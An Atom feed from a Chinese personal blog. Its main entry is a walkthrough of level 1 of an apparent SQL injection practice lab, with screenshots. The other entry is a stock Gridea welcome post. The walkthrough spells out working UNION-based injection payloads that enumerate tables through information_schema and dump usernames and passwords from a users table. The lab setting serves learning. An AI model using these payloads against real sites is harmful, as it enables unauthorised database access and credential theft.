<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://lovectrl-tan.github.io</id>
    <title>LoveCtrl-Tan</title>
    <updated>2019-10-17T10:21:07.203Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://lovectrl-tan.github.io"/>
    <link rel="self" href="https://lovectrl-tan.github.io/atom.xml"/>
    <subtitle>温故而知新</subtitle>
    <logo>https://lovectrl-tan.github.io/images/avatar.png</logo>
    <icon>https://lovectrl-tan.github.io/favicon.ico</icon>
    <rights>All rights reserved 2019, LoveCtrl-Tan</rights>
    <entry>
        <title type="html"><![CDATA[sqli注入]]></title>
        <id>https://lovectrl-tan.github.io/post/sqli-zhu-ru</id>
        <link href="https://lovectrl-tan.github.io/post/sqli-zhu-ru">
        </link>
        <updated>2019-10-17T09:07:25.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="第一关">第一关</h1>
<p>首先我们进去网页,可以看到他让我们输入ID<br>
<img src="https://lovectrl-tan.github.io/post-images/1571303427322.png" alt=""><br>
now,现在我们在网址上输入<code>?id=1</code><br>
可以看到出现了用户名和密码<br>
<img src="https://lovectrl-tan.github.io/post-images/1571303704750.png" alt=""><br>
接下来我们输入<code>?id=1'</code>来检查是否存在注入漏洞<br>
<img src="https://lovectrl-tan.github.io/post-images/1571304389811.png" alt=""><br>
报错啦，接下来我们使用<code>?id=1' and 1=1--+</code>和<code>?id=1' and 1=2--+</code>来进一步判断<br>
<img src="https://lovectrl-tan.github.io/post-images/1571304532317.png" alt=""><br>
<img src="https://lovectrl-tan.github.io/post-images/1571304537912.png" alt=""><br>
因为<code>1=1</code>恒成立，所以它显示正确，而<code>1=2</code>不成立，它就报错啦，我们可以判断出他可能存在sql注入漏洞<br>
接下来我们用<code>?id=1' order by 1--+</code>判断它存在多少个字段数,我们需要使用单引号来使它闭合,如果显示正常后面数字就<code>++</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571304893010.png" alt=""><br>
<img src="https://lovectrl-tan.github.io/post-images/1571304936106.png" alt=""><br>
可以看到，当它为<code>?id=1' order by 4--+</code>报错，那么它的字段数就为<code>3</code><br>
接下来我们使用<code>?id=-1'union select 1,2,3--+</code>联合查询,我们要使第一条语句报错，否则只会返回第一条结果<br>
<img src="https://lovectrl-tan.github.io/post-images/1571305174754.png" alt=""><br>
返回结果为<code>2:3</code>，意味着我们可以在这两个位置输入Mysql语句<br>
首先我们查询数据库名<code>?id=-1' union select 1,database(),3--+</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571305355639.png" alt=""><br>
成功的返回了数据库名。<br>
接着我们输入以下命令查询表名<br>
<code>?id=-1' union select 1,(select table_name from information_schema.tables where table_schema='security' limit 0,1),3--+</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571305494213.png" alt=""><br>
返回了第一个表名，<code>limit 0,1</code>的意思就是查询第一个表名<br>
我们接着查询其余表名，当查询到第4个表名，即<code>limit 3,1</code>时<br>
<img src="https://lovectrl-tan.github.io/post-images/1571305651643.png" alt=""><br>
这个一看就是存放用户名的<br>
接下来我们要查询这个表里的字段名<br>
<code>?id=-1' union select 1,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),3--+</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571305797571.png" alt=""><br>
返回了第一个字段名<code>id</code>,我们接着查询，知道剩下的是<code>username``password</code><br>
这时候我们就可以查询数据啦<br>
构造SQL语句查询<code>?id=-1' union select 1,(select username from security.users limit 0,1),3--+</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571306002970.png" alt=""><br>
我们也可以在两个位置上同时爆出用户名和密码<br>
<code>?id=-1' union select 1,(select username from security.users limit 0,1),(select password from security.users limit 0,1)--+</code><br>
<img src="https://lovectrl-tan.github.io/post-images/1571306087976.png" alt=""><br>
好啦，第一关就到此为止啦</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Hello Gridea]]></title>
        <id>https://lovectrl-tan.github.io/post/hello-gridea</id>
        <link href="https://lovectrl-tan.github.io/post/hello-gridea">
        </link>
        <updated>2018-12-11T16:00:00.000Z</updated>
        <summary type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
]]></summary>
        <content type="html"><![CDATA[<p>👏  欢迎使用 <strong>Gridea</strong> ！<br>
✍️  <strong>Gridea</strong> 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ...</p>
<!-- more -->
<p><a href="https://github.com/getgridea/gridea">Github</a><br>
<a href="https://gridea.dev/">Gridea 主页</a><br>
<a href="http://fehey.com/">示例网站</a></p>
<h2 id="特性">特性👇</h2>
<p>📝  你可以使用最酷的 <strong>Markdown</strong> 语法，进行快速创作</p>
<p>🌉  你可以给文章配上精美的封面图和在文章任意位置插入图片</p>
<p>🏷️  你可以对文章进行标签分组</p>
<p>📋  你可以自定义菜单，甚至可以创建外部链接菜单</p>
<p>💻  你可以在 <strong>Windows</strong>，<strong>MacOS</strong> 或 <strong>Linux</strong> 设备上使用此客户端</p>
<p>🌎  你可以使用 <strong>𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌</strong> 或 <strong>Coding Pages</strong> 向世界展示，未来将支持更多平台</p>
<p>💬  你可以进行简单的配置，接入 <a href="https://github.com/gitalk/gitalk">Gitalk</a> 或 <a href="https://github.com/SukkaW/DisqusJS">DisqusJS</a> 评论系统</p>
<p>🇬🇧  你可以使用<strong>中文简体</strong>或<strong>英语</strong></p>
<p>🌁  你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力</p>
<p>🖥  你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步</p>
<p>🌱 当然 <strong>Gridea</strong> 还很年轻，有很多不足，但请相信，它会不停向前 🏃</p>
<p>未来，它一定会成为你离不开的伙伴</p>
<p>尽情发挥你的才华吧！</p>
<p>😘 Enjoy~</p>
]]></content>
    </entry>
</feed>